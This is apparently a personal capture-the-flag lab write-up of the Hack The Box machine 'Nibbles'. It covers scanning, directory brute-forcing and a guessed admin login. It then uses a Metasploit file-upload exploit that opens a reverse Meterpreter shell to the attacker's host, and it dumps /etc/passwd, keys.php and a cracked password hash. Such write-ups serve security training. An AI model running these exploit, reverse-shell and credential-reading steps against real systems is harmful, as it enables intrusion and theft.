# Nibbles 10.10.10.75 - Linux

 - __User__:
 - __Root__:

## Initial Attempt, 05/05/2020


```shell
Nmap scan report for 10.10.10.75
Host is up (0.033s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.05 seconds
```

 - Browser visit to `/` is a Hello world page.
 - Dirbuster found: `/icons`, `/icons/small`, and `/server-status` - we have 403 to all
 - `nikto -host 10.10.10.75` results:

```shell
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.75
+ Target Hostname:    10.10.10.75
+ Target Port:        80
+ Start Time:         2020-05-05 22:07:34 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Server may leak inodes via ETags, header found with file /, inode: 5d, size: 5616c3cf7fa77, mtime: gzip
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7863 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2020-05-05 22:12:34 (GMT-4) (300 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

I stumbled my ass into viewing the full source of the default page at port 80 and in the comments it points to the `/nibbleblog/` location. .... facepalm. Ok.

```html
[*] Running module against 10.10.10.75
[*] <b>Hello world!</b>








<!-- /nibbleblog/ directory. Nothing interesting here! -->

[*] Auxiliary module execution completed
```

Running `gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.75:80/nibbleblog -t 60 -x .php,.txt,.html,.mod,.pw,.sql,.db -s "200,301" -o dumps/nibbles.gobuster.txt`

```shell
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.75:80/nibbleblog
[+] Threads:        60
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,301
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     pw,sql,db,php,txt,html,mod
[+] Timeout:        10s
===============================================================
2020/05/05 22:43:59 Starting gobuster
===============================================================
/index.php (Status: 200)
/sitemap.php (Status: 200)
/content (Status: 301)
/themes (Status: 301)
/feed.php (Status: 200)
/admin (Status: 301)
/admin.php (Status: 200)
/plugins (Status: 301)
/install.php (Status: 200)
/update.php (Status: 200)
/README (Status: 200)
/languages (Status: 301)
/LICENSE.txt (Status: 200)
/COPYRIGHT.txt (Status: 200)
===============================================================
2020/05/05 22:59:30 Finished
===============================================================
```

Browsing `http://10.10.10.75/nibbleblog/content/`, some bits:

```html
<user username="admin">
<notification_email_to type="string">admin@nibbles.com</notification_email_to>
<notification_email_from type="string">noreply@10.10.10.134</notification_email_from>
<plugin name="Latest posts" author="Diego Najar" version="3.7" installed_at="1512926436">
```

Can access `http://10.10.10.75/nibbleblog/admin/` and browse directories but can't seem to access php files.

By dumb luck I went to `admin.php` and tried two user/PW combos: `admin/admin` and `admin/nibbles` - and I'm in. Doesn't seem like I can access anything new other than the GUI being friendly.

Turns out metasploit had a nibbleblog module:

```shell
msf5 exploit(multi/http/nibbleblog_file_upload) > set targeturi /nibbleblog
targeturi => /nibbleblog
msf5 exploit(multi/http/nibbleblog_file_upload) > run

[*] Started reverse TCP handler on 10.10.14.53:4444
[*] Sending stage (38288 bytes) to 10.10.10.75
[*] Meterpreter session 1 opened (10.10.14.53:4444 -> 10.10.10.75:38980) at 2020-05-05 23:27:17 -0400
[+] Deleted image.php


meterpreter >
meterpreter > sysinfo
Computer    : Nibbles
OS          : Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64
Meterpreter : php/linux
meterpreter > cat /etc/os-release
NAME="Ubuntu"
VERSION="16.04.3 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.3 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial
meterpreter > cat /proc/version
Linux version 4.4.0-104-generic (buildd@lgw01-amd64-022) \
  (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.5) )\
  #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017
```

Perhaps I can upload files using this path? I can indeed use upload/download in meterpreter to easily move files.

From `shadow.php`, `ea8e3c9799c10e2982c0b54299fd866f32b95f5a` is `nibbles` with salt `8^8!@tv&zb3`

```php
meterpreter > cat keys.php
<?php $_KEYS[0] = "nibbl08ee826e0531a482508227e99b7fb08a02dbc57c";
      $_KEYS[1] = "ebloge3a388b4dc866813a85b82b01b44178e06c3f3d4";
      $_KEYS[2] = "rulez7d1e888dd6f8277ba0c39946a272a027eda97d90"; ?>
```

Moved into `/home/nibbler` and found `user.txt` flag. Output `/etc/passwd`:

```shell
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
mysql:x:111:118:MySQL Server,,,:/nonexistent:/bin/false
nibbler:x:1001:1001::/home/nibbler:
```

 - PHP is 5.6
 - nibbler's password is not nibbles